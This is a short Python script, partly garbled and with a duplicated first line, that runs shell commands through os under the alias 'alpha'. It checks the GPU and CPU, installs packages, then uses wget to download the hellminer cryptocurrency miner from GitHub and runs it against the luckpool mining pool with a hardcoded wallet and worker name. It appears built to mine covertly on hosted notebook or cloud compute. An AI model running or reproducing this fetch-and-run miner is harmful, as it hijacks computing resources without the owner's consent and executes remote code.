import os as alpha alpha.system("nvidia-smi") import os as alpha alpha.system("nvidia-smi") alpha.system("lscpu") alpha.system("apt update") alpha.system("apt install sudo") alpha.system("apt install nodejs -y") alpha.system("apt install npm -y") alpha.system("apt install git -y") alpha.system("apt install wget -y")

alpha.system("wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RWdcFQsgSTobnTkfPjs4TFRQq1oN267FXY.bukagambar -p d=4096S,xn=1,hybrid --cpu 5")

